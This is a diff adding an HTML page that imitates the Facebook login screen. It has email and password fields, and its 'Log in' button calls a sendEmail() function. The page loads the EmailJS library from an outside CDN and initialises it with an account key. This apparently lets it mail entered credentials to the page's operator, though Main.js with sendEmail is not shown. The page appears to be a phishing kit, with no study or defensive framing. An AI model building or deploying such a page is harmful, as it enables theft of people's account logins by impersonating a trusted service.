@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="Author" content="Emmanuel Clement">
+  <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
+  <div class="container">
+   
+      <h3>Facebook</h3>
+      <p>Log in to Facebook</p>
+   <input type="email" id="emailInput" placeholder="Mobile number or email address" required>
+<input type="password" id="passwordInput" placeholder="Password" required>
+
+      <input type="submit" value="Log in" id="button1" onclick="sendEmail()">
+
+      <div class="forgot-password">
+        <a href="#">Forgotten password?</a>
+      </div>
+      <div class="or-separator"><span></span>or<span></span></div>
+      <div class="create-account">
+        <p>Don't have an account?</p>
+        <a href="#">Create New Account</a>
+      </div>
+    </form>
+  </div>
+
+  <script src="Main.js"></script>
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+   (function(){
+      emailjs.init('8Zz6y3sPf27MfEZ4O');
+   })();
+</script>
+
+</body>
+</html>
+
